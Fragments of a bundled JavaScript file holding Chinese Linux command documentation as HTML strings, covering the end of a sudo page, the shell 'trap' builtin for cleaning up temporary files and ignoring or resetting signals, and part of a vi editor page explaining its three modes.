有自己的方式来保护安全。以root的身份执行<code>sudo-V</code>，查看一下sudo的设置。因为考虑到安全问题，一部分环境变量并没有传递给sudo后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL等。当然，你也可以通过sudoers来配置这些环境变量。</p>\\n\";\n\n\n//////////////////\n// WEBPACK

&quot;[rm](https://philipding.github.io/linux-command/rm &quot;rm命令&quot;) -f $WORKDIR/work1$ $WORKDIR/dataout$; exit&quot; 2\\n</code></pre><p>执行shell程序，这个陷阱的角度，这两个文件work1$$ 和 dataout$$将被自动删除，如果程序接收信号数为2。</p>\\n<p>因此，用户中断执行，如果执行的程序后，这个陷阱你可以放心，这两个文件将被清理。 exit 命令如下 rm 是必要的，因为没有它的执行将继续在节目中的一点，它离开时收到信号。</p>\\n<p>1号信号产生挂断：要么有人故意挂断线路或线路被意外断开。</p>\\n<p>您可以修改前面的陷阱也删除指定的文件，在这种情况下，两个信号信号1号添加到列表：</p>\\n<pre><code>$ trap &quot;rm $WORKDIR/work1$ $WORKDIR/dataout$; exit&quot; 1 2\\n</code></pre><p>现在，这些文件将被删除，如果该行被挂了，或者按Ctrl c键被按下。</p>\\n<p>来捕获指定的命令必须用引号括起来，如果它们包含一个以上的命令。另外请注意，在 shell 命令行扫描 trap 命令得到执行，并再次当一个所列出的的信号被接收的时间。</p>\\n<p>WORKDIR 值 $$ 所以在前面的例子中，将被取代 trap 命令执行的时间。如果你想这种替代发生在收到信号1或2的时间你可以把单引号内的命令：</p>\\n<pre><code>$ trap &#39;rm $WORKDIR/work1$ $WORKDIR/dataout$; exit&#39; 1 2\\n</code></pre><p><strong>2、忽略信号：</strong></p>\\n<p>如果陷阱列出的命令是空的，指定的信号接收时，将被忽略。例如，下面的命令：</p>\\n<pre><code>$ trap &#39;&#39; 2\\n</code></pre><p>指定的中断信号是被忽略的。你可能要忽略某些信号时进行一些操作，不希望打断。可以指定多个信号被忽略如下：</p>\\n<pre><code>$ trap &#39;&#39; 1 2 3 15\\n</code></pre><p>注意，第一个参数必须被指定为一个信号被忽略，而不是相当于写入下面的内容，它具有独立的含义也各有：</p>\\n<pre><code>$ trap  2\\n</code></pre><p>如果你忽略了一个信号，所有的子shell也忽略该信号。不过，如果指定要采取的行动在收到的信号，所有的子shell仍然会在收到该信号的默认操作。</p>\\n<p><strong>3、重设陷阱：</strong></p>\\n<p>当你改变了默认在收到信号后应采取的动作，你可以改变它回来的陷阱，如果你只是省略第一个参数;</p>\\n<pre><code>$ trap 1 2\\n</code></pre><p>复位应采取的动作收到信号1或2返回默认。</p>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/trap.md\n// module id = 503\n// module chunks = 0","module.exports =

title=\\\"ex命令\\\">ex</a>转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。</p>\\n<p><strong>命令方式</strong></p>\\n<p>在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。</p>\\n<p><strong>输入方式</strong></p>\\n<p>通过输入vi的插入命令（i）、附加命令（a）、打开命令（o）、替换命令（s）、修改命令(c）或取代命令（r）可以从命令方式进入输入方式。在输入方式下，从键盘上输入的所有字符都被插入到正在编辑的缓冲区中，被当做该文件的正文。进入输入方式后，输入的可见字符都在屏幕上显示出来，而编辑命令不再起作用，仅作为普通字母出现。例如，在命令方式下输入字母i，进到输入方式，然后再输入i，就在屏幕上相应光标处添加一个字母i。</p>\\n<p>由输入方式回到命令方式的办法是按下Esc键。如果已在命令方式下，那么按下Esc键就会发出“嘟嘟”声。为了确保用户想执行的vi命令是在命令方式下输入的，不妨多按几下Esc键，听到嘟声后再输入命令。</p>\\n<p><strong>ex转义方式</strong></p>\\n<p>vi和ex编辑器的功能是相同的，二者的主要区别是用户界面。在vi中，命令通常是单个字母，如a,x,r等。而在ex中，命令是以Enter；键结束的命令行。vi有一个专门的“转义”命令，可访问很多面向行的ex命令。为使用ex转义方式，可输入一个冒号（:）。作为ex命令提示符，冒号出现在状态行（通常在屏幕最下一行）。按下中断键（通常是Del键），可终止正在执行的命令。多数文件管理命令都是在ex转义方式下执行的（例如，读取文件，把编辑缓冲区的内容写到文件中等）。转义命令执行后，自动回到命令方式。例如：</p>\\n<pre><code>:1,$s/I/i/g 按Enter键\\n</code></pre><p>则从文件第一行至文件末尾（$）将大写I全部替换成小写i。vi编辑器的三种工作方式之间的转换如图所示。</p>\\n<p><img src=\\\"https://philipding.github.io/linux-command/wp-content/uploads/2013/11/vi.jpg\\\"
